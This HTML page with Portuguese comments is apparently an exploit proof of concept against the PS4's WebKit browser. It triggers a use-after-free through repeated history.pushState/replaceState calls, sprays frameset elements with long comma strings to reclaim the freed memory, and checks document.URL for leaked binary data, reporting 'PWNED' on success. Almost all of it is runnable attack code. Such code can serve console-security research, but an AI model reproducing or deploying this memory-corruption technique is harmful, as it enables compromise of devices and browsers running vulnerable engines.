<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - Frameset 680KB Reclaim</title>
<style>
    body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
    button { padding: 15px; width: 100%; font-weight: bold; background: #222; color: #fff; border: 2px solid #0f0; cursor: pointer; }
    #log { border-top: 1px solid #555; margin-top: 20px; padding-top: 10px; white-space: pre-wrap; }
</style>
</head>
<body>
<h2>PS4 WebKit - Frameset 680KB Reclaim</h2>
<div id="status">Pronto</div>
<button onclick="runCorrectedFrameset()">INICIAR FRAMESET (CORRIGIDO)</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m) { logEl.innerHTML += m + "<br>"; }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

async function runCorrectedFrameset() {
    logEl.innerHTML = "";
    keepAlive = []; 

    // === FASE 1: TRIGGER UAF ===
    statusEl.innerText = "1. Abrindo buraco (UAF)...";
    log("Disparando UAF...");
    
    // Configuração exata que gerou o buraco de 680KB
    let size = 977;
    const STEP = 14461;
    let finalSize = 0;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        
        finalSize = size; // Isso é o tamanho em caracteres
        size += STEP;
        await sleep(5);
    }
    
    // Cálculo baseado no seu LOG: Caracteres * 2 (UTF-16)
    let holeSizeBytes = finalSize * 2; 
    log(`Tamanho do Buraco Detectado: ${holeSizeBytes} bytes`);
    
    await sleep(50);
    
    // === FASE 2: FRAMESET SPRAY (CORRIGIDO) ===
    statusEl.innerText = "2. Spraying Framesets...";
    
    // Cada vírgula ',' no frameset consome 8 bytes (Length object)
    // Subtraímos um pequeno overhead de header (aprox 16 bytes = 2 Lengths)
    let targetCommas = Math.floor(holeSizeBytes / 8);
    
    log(`Estratégia: Usar ~${targetCommas} vírgulas.`);
    log(`Cálculo: ${targetCommas} * 8 bytes = ~${holeSizeBytes} bytes`);

    // Shotgun: Variar +/- 200 vírgulas para garantir alinhamento de header
    for(let delta = -200; delta <= 200; delta += 4) {
        let count = targetCommas + delta;
        
        try {
            // String gigante de vírgulas
            let payload = ",".repeat(count);
            
            // Criamos lotes
            for(let k=0; k<2; k++) {
                let f = document.createElement("frameset");
                f.rows = payload; 
                keepAlive.push(f);
            }
        } catch(e) {
            log("Erro de memória no spray: " + e.message);
        }
    }

    log(`Spray concluído. ${keepAlive.length} framesets criados.`);
    await sleep(200);

    // === FASE 3: VERIFICAÇÃO ===
    statusEl.innerText = "3. Checando URL...";
    let url = document.URL;
    
    // Se o frameset ocupou a memória, a URL não será mais "VVVV..."
    // Ela vai conter dados binários da estrutura Length.
    // Procuramos qualquer coisa que NÃO seja 'V' (0x56) ou 'h' (0x68) ou '%'
    
    let changed = false;
    let sample = "";
    
    // Checamos offsets aleatórios no meio do buffer
    for(let i = 1000; i < 5000; i++) {
        if(url[i] !== 'V') {
            changed = true;
            // Captura uma amostra do que está lá
            for(let k=0; k<10; k++) sample += url.charCodeAt(i+k).toString(16) + " ";
            break;
        }
    }

    if(changed) {
        log("!!! JACKPOT ABSOLUTO !!!");
        log("A memória mudou! O Frameset ocupou o buraco.");
        log("Dados encontrados: " + sample);
        statusEl.innerText = "PWNED: FRAMESET RECLAIM";
    } else {
        log("Falha: Ainda vendo apenas 'V'.");
        log("Nota: Se falhar, o buraco pode ser maior que 680644 bytes (headers internos).");
    }
}
</script>
</body>
</html>
